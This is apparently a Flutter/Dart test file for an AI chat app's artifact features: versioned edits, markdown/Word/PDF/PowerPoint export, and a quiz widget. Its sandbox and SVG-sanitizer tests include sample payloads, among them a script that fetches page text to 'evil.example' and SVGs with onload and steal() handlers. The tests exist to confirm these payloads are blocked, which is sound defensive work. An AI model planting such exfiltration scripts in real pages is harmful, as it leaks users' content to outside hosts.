import 'dart:convert';
import 'dart:io';

import 'package:archive/archive.dart';

import 'package:every_ai/core/platform/platform_kind.dart';
import 'package:every_ai/core/preferences.dart';
import 'package:every_ai/core/theme/every_theme.dart';
import 'package:every_ai/features/artifacts/domain/artifact.dart';
import 'package:every_ai/features/artifacts/export/doc_model.dart';
import 'package:every_ai/features/artifacts/export/docx_writer.dart';
import 'package:every_ai/features/artifacts/export/downloads.dart';
import 'package:every_ai/features/artifacts/export/svg_raster.dart';
import 'package:every_ai/features/chat/data/chat_transport.dart';
import 'package:every_ai/features/artifacts/ui/renderers/quiz_view.dart';
import 'package:every_ai/features/artifacts/ui/renderers/svg_view.dart';
import 'package:every_ai/features/chat/domain/message.dart';
import 'package:flutter/widgets.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:material_ui/material_ui.dart' as m;

Message _assistant(String id, List<ToolCallPart> calls) =>
    Message(id: id, conversationId: 'c', role: Role.assistant, parts: calls, createdAt: DateTime(2026));

ToolCallPart _call(String tool, Map<String, Object?> args, String id) =>
    ToolCallPart(toolName: tool, argumentsJson: jsonEncode(args), callId: id);

const _svg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><rect width="10" height="10"/></svg>';
final _doc =
    '''# Report

Intro with **bold**, *italic*, `code` and a [link](https://example.com).

```svg
$_svg
```

- one
- two
  1. nested

| A | B |
|---|---|
| 1 | 2 |

\$\$E = mc^2\$\$

```mermaid
graph TD; A-->B
```

<svg viewBox="0 0 4 4"><circle r="2"/></svg>
''';

Future<RasterFigure?> _fakeRaster(String svg) async => (
  png: base64Decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=='),
  width: 100.0,
  height: 50.0,
);

void main() {
  test('edit_artifact applies find-and-replace edits to the previous version', () {
    final artifacts = artifactsIn([
      _assistant('m1', [
        _call('create_artifact', {
          'id': 'doc',
          'title': 'Doc',
          'kind': 'markdown',
          'content': 'alpha\nbeta  \ngamma',
        }, 't1'),
      ]),
      _assistant('m2', [
        _call('edit_artifact', {
          'id': 'doc',
          'edits': [
            {'old_text': 'alpha', 'new_text': 'ALPHA'},
            {'old_text': 'beta\ngamma', 'new_text': 'BG'}, // trailing spaces differ
            {'old_text': 'nowhere', 'new_text': 'x'},
          ],
        }, 't2'),
        _call('edit_artifact', {'id': 'unknown', 'edits': []}, 't3'),
      ]),
    ]);
    expect(artifacts, hasLength(1));
    final latest = artifacts.single.latest;
    expect(latest.str('content'), 'ALPHA\nBG');
    expect(latest.kind, VisualKind.document);
    expect(latest.args['edit_missed'], ['nowhere']);
    expect(latest.callId, 't2');
  });

  test('history sends each artifact once, latest content in the message that last changed it', () {
    final history = [
      _assistant('m1', [
        _call('create_artifact', {'id': 'doc', 'title': 'Doc', 'kind': 'markdown', 'content': 'v1'}, 't1'),
        _call('make_quiz', {'title': 'Q', 'questions': []}, 't2'),
      ]),
      _assistant('m2', [
        _call('edit_artifact', {
          'id': 'doc',
          'edits': [
            {'old_text': 'v1', 'new_text': 'v2'},
          ],
        }, 't3'),
      ]),
    ];
    final out = toolOutputsByMessage(history);
    expect(out['m1'], contains('earlier version'));
    expect(out['m1'], contains('[Showed the user quiz: Q]'));
    expect(out['m1'], isNot(contains('v1')));
    expect(out['m2'], '<artifact id="doc" kind="markdown" title="Doc">\nv2\n</artifact>');
  });

  test('doc model: blocks, figures (fenced and raw), math, diagrams, tables', () {
    final blocks = parseDoc(_doc);
    expect(blocks.whereType<HeadingBlock>().single.level, 1);
    final runs = blocks.whereType<ParagraphBlock>().first.runs;
    expect(runs.where((r) => r.bold).single.text, 'bold');
    expect(runs.where((r) => r.code).single.text, 'code');
    expect(runs.where((r) => r.link != null).single.link, 'https://example.com');
    expect(blocks.whereType<FigureBlock>(), hasLength(2));
    expect(blocks.whereType<MathBlock>().single.tex, 'E = mc^2');
    expect(blocks.whereType<DiagramBlock>().single.source, 'graph TD; A-->B');
    expect(blocks.whereType<TableBlock>().single.rows.single.map((c) => c.single.text), ['1', '2']);
    expect(blocks.whereType<ListBlock>().single.items, hasLength(2));
    expect(svgFiguresIn(_doc), hasLength(2));
    // Raw <svg> inside a code fence stays code.
    expect(fenceRawSvg('```html\n<svg></svg>\n```'), '```html\n<svg></svg>\n```');
  });

  test('markdown downloads: inline svg, and a zip with figure files', () {
    final inline = markdownWithInlineSvg(_doc);
    expect(inline, isNot(contains('```svg')));
    expect(inline, contains(_svg));
    final zip = ZipDecoder().decodeBytes(markdownZip(_doc, 'report'));
    expect(
      zip.files.map((f) => f.name),
      containsAll(['report/report.md', 'report/figures/figure-1.svg', 'report/figures/figure-2.svg']),
    );
    final md = utf8.decode(zip.findFile('report/report.md')!.content);
    expect(md, contains('![Figure 1](figures/figure-1.svg)'));
  });

  test('downloads keep the sandbox and the sanitizer; Copy keeps the source', () async {
    const page = '<script>fetch("https://evil.example/?d="+document.body.innerText)</script><p>hi</p>';
    final html = Visual.fromPart(
      _call('create_artifact', {'id': 'a', 'kind': 'html', 'title': 'Page', 'content': page}, 'h'),
    )!;
    final saved = utf8.decode(await downloadsOf(html).single.build());
    expect(saved, startsWith('<!doctype html>'));
    expect(saved.indexOf('Content-Security-Policy'), lessThan(saved.indexOf('<iframe')));
    expect(saved, contains('sandbox="allow-scripts"'));
    expect(saved, isNot(contains('<script>fetch')), reason: 'the page is only inside the escaped srcdoc');
    expect(exportOf(html).text, page);

    const bad =
        '<svg xmlns="http://www.w3.org/2000/svg" onload="steal()"><script>steal()</script>'
        '<image href="https://evil.example/p.png"/><rect width="1" height="1"/></svg>';
    final svg = Visual.fromPart(_call('render_svg', {'title': 'Fig', 'svg': bad}, 's'))!;
    final svgFile = utf8.decode(await downloadsOf(svg).firstWhere((o) => o.extension == 'svg').build());
    final doc = 'Text\n\n```svg\n$bad\n```\n';
    final zip = ZipDecoder().decodeBytes(markdownZip(doc, 'r'));
    for (final out in [
      svgFile,
      markdownWithInlineSvg(doc),
      utf8.decode(zip.findFile('r/figures/figure-1.svg')!.content),
    ]) {
      expect(out, contains('<rect'));
      expect(out, isNot(contains('<script')));
      expect(out, isNot(contains('onload')));
      expect(out, isNot(contains('evil.example')));
    }
  });

  test('word export is a valid package with the figure embedded', () async {
    final figures = await rasterizeAll(svgFiguresIn(_doc), _fakeRaster);
    final bytes = buildDocx(title: 'Report', blocks: parseDoc(_doc), figures: figures);
    final zip = ZipDecoder().decodeBytes(bytes);
    expect(zip.findFile('word/media/image1.png'), isNotNull);
    final xml = utf8.decode(zip.findFile('word/document.xml')!.content);
    expect(xml, contains('w:pStyle w:val="Heading1"'));
    expect(xml, contains('<w:tbl>'));
    expect(xml, contains('r:embed="rId'));
    if (Platform.environment['EXPORT_OUT'] case final dir?) File('$dir/report.docx').writeAsBytesSync(bytes);
  });

  test('pdf export renders every block', () async {
    final bytes = await pdfOf(
      'Report',
      _doc,
      rasterize: _fakeRaster,
      drawDiagram: (_) async => null,
      drawMath: (_) async => null,
    );
    expect(String.fromCharCodes(bytes.take(5)), '%PDF-');
    if (Platform.environment['EXPORT_OUT'] case final dir?) File('$dir/report.pdf').writeAsBytesSync(bytes);
  });

  test('artifacts collect their versions across messages; updates keep kind and language', () {
    final artifacts = artifactsIn([
      _assistant('m1', [
        _call('create_artifact', {
          'id': 'app',
          'title': 'App',
          'kind': 'code',
          'language': 'dart',
          'content': 'v1',
        }, 't1'),
        _call('make_quiz', {'title': 'Q', 'questions': []}, 't2'),
      ]),
      _assistant('m2', [
        _call('update_artifact', {'id': 'app', 'content': 'v2'}, 't3'),
        _call('create_artifact', {'id': 'notes', 'title': 'Notes', 'kind': 'markdown', 'content': '# Hi'}, 't4'),
      ]),
    ]);
    expect(artifacts.map((a) => a.id), ['app', 'notes']);
    final app = artifacts.first;
    expect(app.versions.map((v) => v.str('content')), ['v1', 'v2']);
    expect(app.latest.kind, VisualKind.code);
    expect(app.latest.str('language'), 'dart');
    expect(app.title, 'App');
    expect(artifacts.last.latest.kind, VisualKind.document);
  });

  test('visual kinds, and which open in the panel', () {
    Visual v(String tool, [Map<String, Object?> args = const {}]) => Visual.fromPart(_call(tool, args, 'x'))!;
    expect(v('render_chart').kind, VisualKind.chart);
    expect(v('make_slides').kind.opensInPanel, isTrue);
    expect(v('make_quiz').kind.opensInPanel, isFalse);
    expect(v('create_artifact', {'kind': 'mermaid'}).kind, VisualKind.diagram);
    expect(Visual.fromPart(_call('web_fetch', {}, 'x')), isNull);
    expect(Visual.fromPart(const ToolCallPart(toolName: 'make_quiz', argumentsJson: '{bad')), isNull);
  });

  test('exports: code by language, slides as markdown outline', () {
    final code = Visual.fromPart(
      _call('create_artifact', {'title': 'Fib Sequence!', 'kind': 'code', 'language': 'python', 'content': 'x'}, 'a'),
    )!;
    expect(exportOf(code), (text: 'x', name: 'fib-sequence', extension: 'py'));
    final deck = Visual.fromPart(
      _call('make_slides', {
        'title': 'Deck',
        'slides': [
          {
            'title': 'One',
            'bullets': ['a', 'b'],
          },
        ],
      }, 'b'),
    )!;
    expect(exportOf(deck).text, '# Deck\n\n---\n\n# One\n- a\n- b');
  });

  test('PowerPoint export is a zip with one part per slide (PPTX_OUT writes it for inspection)', () {
    final deck = Visual.fromPart(
      _call('make_slides', {
        'title': 'Riverpod & <you>',
        'subtitle': 'State, simply',
        'theme': 'navy',
        'slides': [
          {
            'title': 'Why',
            'bullets': ['Testable', 'Compile-safe "providers"'],
            'notes': 'Say hi',
          },
          {'title': 'Body', 'body': '**Bold** line\nSecond line'},
        ],
      }, 'deck'),
    )!;
    final bytes = pptxOf(deck);
    final zip = ZipDecoder().decodeBytes(bytes);
    final names = zip.files.map((f) => f.name).toSet();
    expect(names, containsAll(['ppt/presentation.xml', 'ppt/slides/slide3.xml', 'ppt/theme/theme1.xml']));
    expect(names.contains('ppt/slides/slide4.xml'), isFalse);
    final title = utf8.decode(zip.findFile('ppt/slides/slide1.xml')!.content as List<int>);
    expect(title, contains('Riverpod &amp; &lt;you&gt;'));
    final out = Platform.environment['PPTX_OUT'];
    if (out != null) File(out).writeAsBytesSync(bytes);
  });

  test('sanitizeSvg strips scripts, handlers and outside references', () {
    final clean = sanitizeSvg(
      '<svg viewBox="0 0 10 10" onload="x()"><script>alert(1)</script>'
      '<image href="https://evil.example/a.png"/><rect onclick=\'y()\' width="5" height="5"/></svg>',
    );
    expect(clean, isNot(contains('script')));
    expect(clean, isNot(contains('onload')));
    expect(clean, isNot(contains('onclick')));
    expect(clean, isNot(contains('evil.example')));
    expect(clean, contains('<rect'));
  });

  group('QuizView', () {
    Widget host(Visual visual) => ProviderScope(
      overrides: [preferencesProvider.overrideWithValue(Preferences.inMemory())],
      child: m.MaterialApp(
        home: m.Material(
          child: EveryThemeScope(
            theme: EveryTheme.resolve(DesignLanguage.material, Brightness.light),
            child: SingleChildScrollView(
              child: QuizView(visual: visual, conversationId: 'c'),
            ),
          ),
        ),
      ),
    );

    final visual = Visual.fromPart(
      _call('make_quiz', {
        'title': 'Zig',
        'questions': [
          {
            'question': 'Which is a Zig keyword?',
            'options': ['comptime', 'goroutine'],
            'answer_index': 0,
            'explanation': 'comptime runs code at compile time.',
          },
          {
            'question': 'Which are allocators?',
            'options': ['ArenaAllocator', 'Writer', 'DebugAllocator'],
            'answer_indices': [0, 2],
            'explanation': 'Both implement std.mem.Allocator.',
          },
        ],
      }, 'quiz-1'),
    )!;

    testWidgets('single answer reveals the explanation; multi-answer needs Check; then a score', (tester) async {
      await tester.pumpWidget(host(visual));
      expect(find.text('Select all that apply'), findsOneWidget);

      await tester.tap(find.text('comptime'));
      await tester.pumpAndSettle();
      expect(find.text('Correct'), findsOneWidget);

      await tester.tap(find.text('ArenaAllocator'));
      await tester.pump();
      expect(find.text('Score: 1 / 2'), findsNothing); // not submitted yet
      await tester.tap(find.text('DebugAllocator'));
      await tester.pump();
      await tester.tap(find.text('Check'));
      await tester.pumpAndSettle();

      expect(find.text('Correct'), findsNWidgets(2));
      expect(find.text('Score: 2 / 2'), findsOneWidget);
      expect(find.text('Explain my mistakes'), findsNothing);
    });

    testWidgets('a wrong pick offers "Explain my mistakes"', (tester) async {
      await tester.pumpWidget(host(visual));
      await tester.tap(find.text('goroutine'));
      await tester.pump();
      await tester.tap(find.text('Writer'));
      await tester.pump();
      await tester.tap(find.text('Check'));
      await tester.pumpAndSettle();
      expect(find.text('Not quite'), findsNWidgets(2));
      expect(find.text('Score: 0 / 2'), findsOneWidget);
      expect(find.text('Explain my mistakes'), findsOneWidget);
    });
  });
}
